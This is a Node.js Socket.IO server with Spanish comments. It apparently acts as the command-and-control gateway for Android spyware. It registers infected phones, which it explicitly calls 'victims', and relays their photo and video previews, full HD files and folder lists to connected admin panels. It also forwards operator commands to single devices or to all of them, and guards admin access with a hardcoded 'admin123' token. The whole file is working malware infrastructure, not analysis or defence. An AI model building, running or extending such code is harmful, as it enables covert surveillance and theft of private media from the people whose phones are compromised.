const express = require('express');
const http = require('http');
const { Server } = require("socket.io");

const app = express();
const server = http.createServer(app);

// CONFIGURACIÓN DE SOCKET.IO
const io = new Server(server, {
    cors: { 
        origin: "*", 
        methods: ["GET", "POST"] 
    },
    maxHttpBufferSize: 5e8, // 100 MB (Vital para videos HD y fotos grandes)
    allowEIO3: true         // CRÍTICO: Permite que Android se conecte sin errores de versión
});

// ALMACENAMIENTO EN MEMORIA
let admins = new Set();    // Lista de paneles Electron conectados
let victims = {};          // Datos de los celulares (Nombre, carpetas, etc.)
let deviceMap = {};        // Mapa { deviceId_Android : socketId } para evitar duplicados

io.on('connection', (socket) => {
    
    // 1. AUTENTICACIÓN (ADMIN O VÍCTIMA)
    const type = socket.handshake.auth.type;
    const token = socket.handshake.auth.token;

    if (type === 'admin' && token === 'admin123') {
        console.log('[ADMIN] Conectado:', socket.id);
        admins.add(socket.id);
        // Al conectar, le enviamos la lista actual de dispositivos
        socket.emit('update_device_list', victims);
    } 

    // 2. RECEPCIÓN DE DATOS DEL CELULAR
    socket.on('usrData', (data) => {
        
        // A) REGISTRO DEL DISPOSITIVO
        if (data.deviceId) {
            const uniqueId = data.deviceId;

            // LÓGICA ANTI-ZOMBIES (Evitar duplicados)
            if (deviceMap[uniqueId] && deviceMap[uniqueId] !== socket.id) {
                const oldSocketId = deviceMap[uniqueId];
                // Borramos la sesión vieja de la lista
                delete victims[oldSocketId];
                
                // Opcional: Desconectar forzosamente el socket fantasma anterior
                const oldSocket = io.sockets.sockets.get(oldSocketId);
                if (oldSocket) {
                    oldSocket.disconnect(true);
                    console.log(`[CLEANUP] Socket fantasma eliminado: ${oldSocketId}`);
                }
            }

            // Guardamos la nueva referencia
            deviceMap[uniqueId] = socket.id;
            
            // Actualizamos la info de la víctima
            victims[socket.id] = {
                name: data.deviceName || "Unknown",
                id: uniqueId,
                socketId: socket.id,
                folders: data.folders || [] // Si envió carpetas, las guardamos
            };

            // Avisamos a todos los admins que hay cambios
            broadcastVictims();
        }

        // B) REENVÍO DE MINIATURAS (FOTOS Y VIDEOS)
        // AQUÍ ESTABA EL ERROR: Ahora aceptamos 'preview_video' también
        if (data.dataType === 'preview_image' || data.dataType === 'preview_video') {
            io.to(Array.from(admins)).emit('new_preview', { ...data, victimId: socket.id });
        } 
        
        // C) REENVÍO DE ARCHIVOS COMPLETOS (HD)
        else if (data.dataType === 'full_image') {
            io.to(Array.from(admins)).emit('receive_full', { ...data, victimId: socket.id });
        }
        
        // D) ACTUALIZACIÓN DE LISTA DE CARPETAS
        else if (data.dataType === 'folder_list') {
            if (victims[socket.id]) {
                victims[socket.id].folders = data.folders;
                broadcastVictims();
            }
        }
    });

    // 3. COMANDOS DEL ADMIN HACIA EL CELULAR
    socket.on('admin_command', (cmd) => {
        // Seguridad: Solo admins pueden enviar comandos
        if (!admins.has(socket.id)) return; 

        if (cmd.target === 'ALL') {
            // Enviar a todos (broadcast excluye al emisor)
            socket.broadcast.emit('command_' + cmd.action, cmd);
        } else {
            // Enviar a uno específico
            io.to(cmd.target).emit('command_' + cmd.action, cmd);
        }
    });
    
    // Solicitud específica de descarga (HD)
    socket.on('order_download', (data) => {
        io.to(data.target).emit('request_full_image', data);
    });

    // 4. DESCONEXIÓN
    socket.on('disconnect', () => {
        if (admins.has(socket.id)) {
            admins.delete(socket.id);
            console.log('[ADMIN] Desconectado');
        } else {
            // Si es una víctima, limpiamos sus datos
            if (victims[socket.id]) {
                const devId = victims[socket.id].id;
                delete deviceMap[devId]; // Liberamos el ID único
                delete victims[socket.id]; // Borramos de la lista visual
                broadcastVictims(); // Avisamos a Electron que lo borre
                console.log('[VICTIM] Desconectado:', socket.id);
            }
        }
    });
});

// Función auxiliar para notificar cambios a todos los paneles conectados
function broadcastVictims() {
    io.to(Array.from(admins)).emit('update_device_list', victims);
}

// INICIO DEL SERVIDOR
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`GATEWAY V2.2 (VIDEO SUPPORT) RUNNING ON PORT ${PORT}`);
});

